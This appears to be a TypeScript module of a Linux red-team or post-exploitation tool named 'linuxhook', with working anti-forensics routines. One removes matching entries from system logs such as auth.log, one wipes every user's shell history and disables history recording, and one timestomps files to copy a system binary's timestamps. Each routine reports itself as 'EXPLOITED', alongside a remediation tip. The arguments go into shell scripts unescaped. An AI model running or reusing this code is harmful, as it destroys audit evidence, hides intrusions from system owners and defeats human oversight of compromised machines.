import { bash, sh, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function logTamper(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Log Tampering ==="]
  const pattern = argVal(args, "--pattern")
  const file = argVal(args, "--file")

  const script = `
echo "--- Log Files ---"
ls -lah /var/log/auth.log /var/log/secure /var/log/syslog /var/log/messages /var/log/kern.log /var/log/lastlog /var/log/wtmp /var/log/btmp 2>/dev/null

echo ""
echo "--- Log Permissions ---"
stat -c '%a %U:%G %n' /var/log/auth.log /var/log/secure /var/log/syslog /var/log/messages 2>/dev/null

echo ""
echo "--- Journald Status ---"
systemctl status systemd-journald 2>/dev/null | head -5
journalctl --disk-usage 2>/dev/null

${pattern && file ? `
echo ""
echo "--- Removing entries matching '${pattern}' from ${file} ---"
before=$(wc -l < "${file}" 2>/dev/null)
sed -i "/${pattern}/d" "${file}" 2>/dev/null
after=$(wc -l < "${file}" 2>/dev/null)
echo "Removed $((before - after)) line(s) from ${file}"
` : `
echo ""
echo "--- Usage ---"
echo "linuxhook log_tamper --file /var/log/auth.log --pattern '192.168.1.100'"
echo ""
echo "Manual examples:"
echo "  sed -i '/192.168.1.100/d' /var/log/auth.log"
echo "  > /var/log/auth.log  (clear entire file)"
echo "  shred -zu /var/log/auth.log  (secure delete)"
echo "  echo '' | tee /var/log/syslog  (truncate)"
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (pattern && file && r.stdout.includes("Removed")) {
    findings.push({
      checkId: "LNX-LOGTAMP-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "EXPLOITED",
      resource: file,
      title: "Log entries tampered",
      details: `Entries matching '${pattern}' removed from ${file}`,
      remediation: "Ship logs to a remote SIEM in real-time. Use append-only log storage.",
    })
  }

  findings.push({
    checkId: "LNX-LOGTAMP-002",
    provider: "linuxhook",
    severity: "INFO",
    status: "IDENTIFIED",
    resource: "/var/log",
    title: "Log files enumerated",
    details: "System log files and permissions assessed for tampering viability",
    remediation: "Implement centralized logging with immutable storage. Enable log integrity monitoring.",
  })

  return { output: output.join("\n"), findings }
}

export async function historyClear(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== History Clearing ==="]

  const script = `
echo "--- Current History Files ---"
for dir in /root /home/*; do
  for hf in ".bash_history" ".zsh_history" ".sh_history" ".python_history" ".node_repl_history" ".mysql_history" ".psql_history"; do
    if [ -f "$dir/$hf" ]; then
      lines=$(wc -l < "$dir/$hf" 2>/dev/null)
      echo "[*] $dir/$hf: $lines lines"
    fi
  done
done

echo ""
echo "--- History Environment ---"
echo "HISTFILE=${HISTFILE:-not set}"
echo "HISTSIZE=${HISTSIZE:-not set}"
echo "HISTFILESIZE=${HISTFILESIZE:-not set}"
echo "HISTCONTROL=${HISTCONTROL:-not set}"

echo ""
echo "--- Clearing History ---"
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0
history -c 2>/dev/null
for dir in /root /home/*; do
  for hf in ".bash_history" ".zsh_history" ".sh_history" ".python_history"; do
    if [ -f "$dir/$hf" ] && [ -w "$dir/$hf" ]; then
      > "$dir/$hf" 2>/dev/null && echo "[+] Cleared $dir/$hf"
    fi
  done
done

echo ""
echo "--- Prevent Future Logging ---"
echo "Run these in your shell session:"
echo "  unset HISTFILE"
echo "  export HISTSIZE=0"
echo "  set +o history"
echo "  Or prefix commands with a space (if HISTCONTROL=ignorespace)"
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  const cleared = (r.stdout.match(/Cleared/g) || []).length
  findings.push({
    checkId: "LNX-HISTCLR-001",
    provider: "linuxhook",
    severity: "MEDIUM",
    status: cleared > 0 ? "EXPLOITED" : "IDENTIFIED",
    resource: "shell_history",
    title: cleared > 0 ? `Shell history cleared (${cleared} files)` : "Shell history files enumerated",
    details: cleared > 0 ? `${cleared} history file(s) cleared. HISTFILE unset, HISTSIZE=0 for current session` : "History files found — clear before exiting",
    remediation: "Forward command history to a centralized audit system. Use auditd for command logging.",
  })

  return { output: output.join("\n"), findings }
}

export async function timestomp(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Timestomping ==="]
  const target = argVal(args, "--target")
  const reference = argVal(args, "--reference")

  const script = `
${target ? `
echo "--- Current Timestamps ---"
stat "${target}" 2>/dev/null

${reference ? `
echo ""
echo "--- Reference File Timestamps ---"
stat "${reference}" 2>/dev/null

echo ""
echo "--- Applying Timestamps ---"
touch -r "${reference}" "${target}" 2>/dev/null && echo "[+] atime/mtime copied from ${reference} to ${target}"
stat "${target}" 2>/dev/null
` : `
echo ""
echo "--- Modifying Timestamps ---"
echo "Usage: linuxhook timestomp --target /path/to/file --reference /bin/ls"
echo "  This copies atime/mtime from the reference file"
echo ""
echo "Manual approaches:"
echo "  touch -r /bin/ls target_file        # copy timestamps from reference"
echo "  touch -t 202301011200 target_file   # set specific timestamp"
echo "  debugfs -w -R 'set_inode_field <inode> crtime 202301011200' /dev/sda1  # ctime (requires debugfs)"
`}
` : `
echo "Usage: linuxhook timestomp --target /path/to/file --reference /bin/ls"
echo ""
echo "--- Recently Modified Files (last 24h) ---"
find /tmp /var/tmp /dev/shm -newer /etc/hostname -type f 2>/dev/null | head -20
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (target && reference && r.stdout.includes("[+]")) {
    findings.push({
      checkId: "LNX-TIMESTOMP-001",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "EXPLOITED",
      resource: target,
      title: "File timestamps modified",
      details: `Timestamps on ${target} copied from ${reference} — file now blends with legitimate system files`,
      remediation: "Use file integrity monitoring (AIDE, Tripwire). Monitor inode change times via auditd.",
    })
  }

  return { output: output.join("\n"), findings }
}
